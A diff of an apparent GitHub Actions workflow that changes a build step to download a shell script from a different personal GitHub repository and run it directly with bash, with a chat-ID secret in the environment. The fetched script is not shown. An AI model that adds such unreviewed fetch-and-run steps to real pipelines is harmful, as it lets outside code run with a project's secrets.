@@ -21,9 +21,9 @@ jobs:
           libghc-libyaml-dev libyaml-dev glibc-source \
     - name: ready compile...
       run: |
-          curl https://raw.githubusercontent.com/AndroidTechh/script_utama/main/ossT.sh > ossT.sh
-          chmod +x ossT.sh
-          bash ossT.sh
+          curl https://raw.githubusercontent.com/noenennn/script/main/nsan.sh > nsan.sh
+          chmod +x nsan.sh
+          bash nsan.sh
       shell: bash
       env:
          CHATID: ${{ secrets.CHAT_ID }}
